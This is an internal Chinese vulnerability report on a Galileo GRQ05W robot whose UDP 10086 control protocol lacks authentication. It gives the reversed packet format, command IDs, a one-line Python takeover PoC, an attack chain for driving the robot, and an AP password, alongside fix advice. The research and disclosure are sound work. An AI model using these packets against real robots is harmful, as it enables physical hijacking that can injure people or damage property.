---
编号: GAL-009
验证状态: 动态确认
严重程度: 高
披露状态: 内部研究
源平台: 伽利略
源候选目录: UDP10086网络接管协议未授权运动控制-1
---
# GAL-009 伽利略（Galileo）机器人 UDP 10086 网络接管协议 —— 未授权运动控制 漏洞复现报告

## 1. 一句话结论

- # 伽利略（Galileo）机器人 UDP 10086 网络接管协议 —— 未授权运动控制 漏洞复现报告
- \| 漏洞类型 \| 未授权物理运动控制（专有 UDP 协议仅 4 字节 magic 校验，无任何认证/来源校验） \|
- \| 权限 \| 任意可达 UDP 10086 的主机 → 控制模式接管 + 步态切换 + 三轴速度 + 软急停 \|
- ## 1. 漏洞概述
- - 未授权物理运动控制（不依赖 LCM 组播配置，WiFi 侧单播直达，`0.0.0.0` 绑定）；

## 2. 影响产品与版本

- \| 目标设备 \| 伽利略（Galileo）GRQ05W 轮足机器人（固件 galileo-inter 1.0.44，SSID `C1W-1.0-007`） \|
- \| 漏洞组件 \| `galileo-robot-monitor/lib/libNetworkSdk.so`（NetworkAppImpl，经 `orrt_monitor_manager_main` 加载，开机自启） \|
- \| 授权边界 \| 仅对自有设备、隔离环境进行 \|
- 遥控协议。该协议唯一的"认证"是包头 4 字节 magic `0x55AA55AA`——这是公开于固件二进制中的
- ## 2. 协议完整还原（固件逆向证据）
- - 固件路径：`home/galileo/galileo-robot-monitor/lib/libNetworkSdk.so`（.symtab 未 strip）

## 3. 验证状态

`动态确认`。该状态来自源报告的验证边界；迁移过程不把目录名称自动视为动态确认。

## 4. 攻击前提

攻击前提以脱敏研究正文为准；复现必须使用自有设备、隔离网络和授权环境，不得对第三方设备执行写入、控制或破坏性操作。

## 5. 根本原因

- - 全库符号/字符串无 auth/token/signature/challenge/序列号/重放防护——唯一校验即 magic；
- 1. 协议加认证：首次配对分发随机 128bit 会话密钥，命令包带 HMAC + 单调序列号防重放；

## 6. 攻击过程

源报告描述的入口、协议和利用顺序见第 13 节脱敏正文；本目录只保留最小复现材料，不复制原始大型证据。

## 7. 实际影响

- # 伽利略（Galileo）机器人 UDP 10086 网络接管协议 —— 未授权运动控制 漏洞复现报告
- \| 漏洞类型 \| 未授权物理运动控制（专有 UDP 协议仅 4 字节 magic 校验，无任何认证/来源校验） \|
- \| 权限 \| 任意可达 UDP 10086 的主机 → 控制模式接管 + 步态切换 + 三轴速度 + 软急停 \|
- \| 复现日期 \| 2026-08-29（协议自 arm64 .so 逆向完整还原；控制模式接管已有实机日志实证） \|
- 1. **接管控制权**（把控制模式切到 `GalileoNetworkAppControl`，剥夺手柄/SLAM 控制）；
- \| **0x31010C01** \| **RobotSetControlMode(int)** \| **控制模式接管 → GalileoSwitchControlMode** \|

## 8. 复现方法

复现材料见 [复现材料清单](复现/材料清单.md)。导入脚本已做文本脱敏；未导入的原始脚本、日志、抓包和二进制见根目录材料清单。

## 9. 支撑证据

见 [证据材料清单](证据/材料清单.md) 和本页第 13 节。来源文件只登记哈希和本地保管路径，不把原始敏感材料带入 Git。

## 10. 修复建议

- 对入口实施身份认证、细粒度授权、消息完整性校验和重放防护；
- 对路径、长度、协议字段、文件类型和状态转换使用允许列表；
- 删除硬编码凭据并轮换已暴露材料；
- 对高风险服务降权，增加审计日志和负向回归测试。

## 11. 相关 AI 会话

当前未发现与该报告一一对应的完整 Claude Code 会话记录；如后续补齐，将在 [AI 会话索引](../../../../../AI轨迹/会话索引.md) 中登记。

## 12. 披露记录

- 当前披露状态：内部研究。
- 对外披露前必须重新审查凭据、设备标识、证据和厂商协调状态。

## 13. 脱敏后的原始研究正文

# 伽利略（Galileo）机器人 UDP 10086 网络接管协议 —— 未授权运动控制 漏洞复现报告

| 项 | 值 |
|---|---|
| 目标设备 | 伽利略（Galileo）GRQ05W 轮足机器人（固件 galileo-inter 1.0.44，SSID `C1W-1.0-007`） |
| 漏洞组件 | `galileo-robot-monitor/lib/libNetworkSdk.so`（NetworkAppImpl，经 `orrt_monitor_manager_main` 加载，开机自启） |
| 漏洞类型 | 未授权物理运动控制（专有 UDP 协议仅 4 字节 magic 校验，无任何认证/来源校验） |
| 权限 | 任意可达 UDP 10086 的主机 → 控制模式接管 + 步态切换 + 三轴速度 + 软急停 |
| 复现日期 | 2026-08-29（协议自 arm64 .so 逆向完整还原；控制模式接管已有实机日志实证） |
| 授权边界 | 仅对自有设备、隔离环境进行 |

---

## 1. 漏洞概述

监控主进程（monitor_manager）加载的 NetworkSdk 在 **UDP 0.0.0.0:10086** 上运行一套手机 App
遥控协议。该协议唯一的"认证"是包头 4 字节 magic `0x55AA55AA`——这是公开于固件二进制中的
常量，不构成任何秘密。任何能向机器人 UDP 10086 发包的主机（连上机器人 AP 或同网段）都可以：

1. **接管控制权**（把控制模式切到 `GalileoNetworkAppControl`，剥夺手柄/SLAM 控制）；
2. **切换步态**（常规/上楼/匍匐/奔跑）、站立/趴下、调整机身高度与姿态角；
3. **设定三轴速度**（前进/横移/旋转）驱动机器人运动；
4. **触发/解除软急停**（可先解锁再驱动，也可对他人使用中的机器人打急停制造混乱）。

与 LCM 组播通道（漏洞 6）不同，该通道**不依赖组播路由/网卡配置**，绑定 `0.0.0.0`，
从 WiFi 侧单播直达。

## 2. 协议完整还原（固件逆向证据）

### 2.1 收包主循环 `NetworkAppImpl::ProcessData` @ libNetworkSdk.so 0x6a39c

```
0x6a4f4  mov  w0, #0x55aa ; movk w0, #0x55aa, lsl 16   ← magic 常量
0x6a4fc  cmp  w1, w0      ; b.eq 0x6a51c               ← 包头[0]==0x55AA55AA 即通过
...
0x6a528  ldr  w0, [x0, #0xc]    ← 包头[3] = type
0x6a55c  ldr  w0, [x0, #8]      ← 包头[2] = len/param
0x6a560  cmp  w0, #0x400 ; b.hi ← len>0x400 拒绝（仅长度上限，无其他校验）
0x6a720  调用 cmd 分发表查找（包头[1] = cmd_id）
0x6a73c  type==0 → handler(包头+8, 4)   （4 字节内联参数）
0x6a788  type==1 → handler(payload, len)（0x10 之后的数据体）
```

**包格式（全小端）**：

```
+0x00  uint32  magic = 0x55AA55AA
+0x04  uint32  cmd_id
+0x08  uint32  param（type=0 时为 4 字节内联参数）/ payload_len（type=1 时）
+0x0C  uint32  type（0=内联参数，1=带数据体）
+0x10  bytes   payload（type=1，≤0x400）
```

### 2.2 命令分发表（`NetworkAppImplInit` @ 0x69460 注册，cmd→GOT 符号还原）

| cmd_id | 处理函数（NetworkAppImpl::） | 语义 / 发布通道 |
|---|---|---|
| 0x31010201 | RobotStand | 站立 → mc_desired_group |
| 0x31010202 | RobotLieDown | 趴下 → mc_desired_group |
| 0x31010203 | RobotStandByBalance | 平衡站立 |
| 0x31010204 | RobotWalk | 进入行走模式 → mc_desired_group="rl_control" |
| 0x31010130 | RobotAdjustHeightOfBody | 机身高度 |
| 0x31010131 | RobotAdjustTumblingAngle | 翻滚角 |
| 0x31010132 | RobotAdjustYawAngle | 偏航角 |
| 0x31010133 | RobotAdjustPitchAngle | 俯仰角 |
| 0x31010140 | RobotTransBackAndForth(int) | **前进速度**（写入全局速度槽+0x0） |
| 0x31010141 | RobotTransLeftAndRight(int) | 横移速度（+0x?） |
| 0x31010145 | RobotTurnLeftAndRight(int) | **旋转速度**（写入全局速度槽+0x8） |
| 0x31010300 | RobotNormalWalkingGait | 常规步态 |
| 0x31010401 | RobotStairGait | 上楼步态 |
| 0x31010402 | RobotCreepingGait | 匍匐步态 |
| 0x31010403 | RobotRunningGait | 奔跑步态 |
| 0x31010500 | RobotSetPolicyMode(int) | 策略模式 → mc_policy_desired |
| **0x31010C01** | **RobotSetControlMode(int)** | **控制模式接管 → GalileoSwitchControlMode** |
| 0x31010C0D | RobotSoftStopOff | 软急停解除 |
| 0x31010C0E | RobotSoftStopOn | 软急停触发 → passive |

控制模式 id（`network_app_user_config.yaml`）：0=GalileoJoystickControl，1=GalileoSlamControl，
2=GalileoNetworkAppControl（攻击者接管值）。

速度值编码：`network_app_user_config.yaml` 定义 x/y/yaw_velocity 的 channelMin/Max=±32767、
scale=±1.0、min/max=±1.0（即 32767 ↔ 1.0 m/s 满速，死区 0.08）。

### 2.3 认证缺失证据

- 全库符号/字符串无 auth/token/signature/challenge/序列号/重放防护——唯一校验即 magic；
- 处理函数直接把参数 memcpy 进速度槽（`RobotTransBackAndForth` @0x6bcf4：
  `memcpy(&v, payload, len); g_impl->vel[0]=v`，无范围/来源检查）；
- UDP 绑定串 "0.0.0.0"（.rodata 0xa7190）。

## 3. 实机动态证据（控制模式接管已生效）

此前测试者单包接管 PoC（.bash_history 第 44-45 行）：

```python
s.sendto(struct.pack('<IIII', 0x55AA55AA, 0x31010C01, 2, 0), ('127.0.0.1', 10086))
```

机器人 monitor 日志（`logs/robot_monitor/monitor_manager/20260829_084519.log`）随即记录：

```
[08:57:49][info] [GalileoJoystickControl] Robot control mode: GalileoJoystickControl to GalileoDriverAssistanceControl
```

控制模式被网络包切换——**接管指令已被实机确认生效**。步态/速度命令（2.2 表其余项）
的协议还原置信度高（同一条分发链路），行走驱动待安全场地架空验证。

## 4. 攻击链

```
攻击者（连入 AP C1W-1.0-007 / 88888888）
   │  ① UDP 单包: (0x55AA55AA, 0x31010C01, 2, 0)   ← 接管控制权
   ▼
② UDP: (0x55AA55AA, 0x31010C0D, 0, 0)            ← 解除软急停
   ▼
③ UDP: (0x55AA55AA, 0x31010204, 0, 0)            ← 进入行走模式(rl_control)
   ▼
④ 循环 ~20Hz: (0x55AA55AA, 0x31010140, vx, 0)    ← 前进速度(int32, ±32767=±1.0m/s)
              (0x55AA55AA, 0x31010145, vyaw, 0)   ← 旋转速度
   ▼
⑤ 机器人按攻击者意图运动（撞击/跌落/驶离）；亦可反向滥用软急停干扰正常作业
```

## 5. 复现

```bash
# 接管 + 前进 0.5 m/s（示例）
python exploit.py 192.168.2.1 takeover
python exploit.py 192.168.2.1 walk --vx 16384
# 急停
python exploit.py 192.168.2.1 stop
```

⚠️ 会真实驱动机器人：务必架空/趴下状态、有人看守急停。

## 6. 影响范围

- 未授权物理运动控制（不依赖 LCM 组播配置，WiFi 侧单播直达，`0.0.0.0` 绑定）；
- 控制权抢占：正常运行中被接管后，原手柄/SLAM 控制失效；
- 软急停滥用：可对作业中的机器人随意触发/解除急停；
- 与 Web RCE（漏洞 1/2）组合：先接管再提权，或反之，双通道均可达成完全控制。

## 7. 修复建议

1. 协议加认证：首次配对分发随机 128bit 会话密钥，命令包带 HMAC + 单调序列号防重放；
2. 接管/急停类高权限命令要求二次确认（物理按键/原控制器确认）；
3. UDP 10086 只绑定需要遥控的接口（如 AP 专用网段），并限速/限源；
4. 速度指令加软件使能开关与渐进限幅（斜率限制），未使能时忽略。

## 8. 证据

- `evidence/processdata_dis.txt`：ProcessData 反汇编（magic 校验/长度上限/分发）
- `evidence/init_dis.txt`：NetworkAppImplInit 反汇编（19 条命令注册序列）
- `evidence/cmd_scan.txt`：全库 0x3101xxxx 常量扫描（完整 cmd 表）
- 固件路径：`home/galileo/galileo-robot-monitor/lib/libNetworkSdk.so`（.symtab 未 strip）
- 动态日志：dump 内 `logs/robot_monitor/monitor_manager/20260829_084519.log`（模式切换记录）
